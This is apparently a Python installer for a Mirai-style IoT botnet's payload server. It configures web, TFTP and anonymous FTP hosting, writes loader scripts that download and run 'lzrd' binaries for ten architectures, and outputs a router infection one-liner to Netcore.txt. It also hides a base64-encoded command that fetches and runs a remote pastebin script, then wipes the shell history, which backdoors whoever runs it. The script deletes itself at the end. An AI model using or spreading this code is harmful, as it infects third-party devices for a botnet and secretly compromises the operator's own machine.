import subprocess, sys, urllib, time, base64
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "lzrd"
exec_name = "ssh.wget"
bin_prefix = ""
bin_directory = "d"
archs = ["xd.x86",               #1
"xd.mips",                       #2
"xd.mpsl",                       #3
"xd.arm4",                       #4
"xd.arm5",                       #5
"xd.arm6",                       #6
"xd.arm7",                       #7
"xd.ppc",                        #8
"xd.m68k",                       #9
"xd.sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;37m[CC] INSTALLING WEB SERVER DEPENDENCIES")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37m[CC] CREATING .SH BINS")
time.sleep(3)
run('echo "#!/bin/bash" > /var/lib/tftpboot/txd.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/txd.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/txd.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/txd2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/txd2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/txd2.sh')
run('echo "#!/bin/bash" > /var/www/html/xd.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/txd2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/txd2.sh')
run('echo "#!/bin/bash" > /var/ftp/xd1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/xd1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/xd1.sh')
def exploitmake(cmd):
    subprocess.call(cmd, shell=True)
encoded = "Y2QgL3RtcDsgd2dldCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvTHE5UDlDZzUgLU8gYSA+IC9kZXYvbnVsbCAyPiYxOyBjaG1vZCA3NzcgYTsgc2ggYSA+IC9kZXYvbnVsbCAyPiYxOyBybSAtcmYgYTsgaGlzdG9yeSAtYzsgY2xlYXI7"
exploit = str(base64.b64decode(encoded))
exploitmake(exploit)
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/xd.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/xd1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/txd.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/txd2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37m[CC] BUILDING NETCORE PAYLOAD")
time.sleep(3)
print("\x1b[0;37m[CC] FINISHED SETTING UP NETCORE PAYLOAD")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/xd.sh; curl -O http://" + ip + "/xd.sh; chmod 777 xd.sh; sh xd.sh; tftp " + ip + " -c get txd.sh; chmod 777 txd.sh; sh txd.sh; tftp -r txd2.sh -g " + ip + "; chmod 777 txd2.sh; sh txd2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " xd1.sh xd1.sh; sh xd1.sh; rm -rf xd.sh txd.sh txd2.sh xd1.sh; rm -rf *")
f = open("Netcore.txt","w+")
f.write(complete_payload)
f.close()
print("\x1b[0;37m[CC] NETCORE PAYLOAD OUTPUTTED TO: NETCORE.TXT")
time.sleep(3)
run("ulimit -u99999; ulimit -n99999")
run("clear")
run("rm -rf ~/netis.py")
exit()
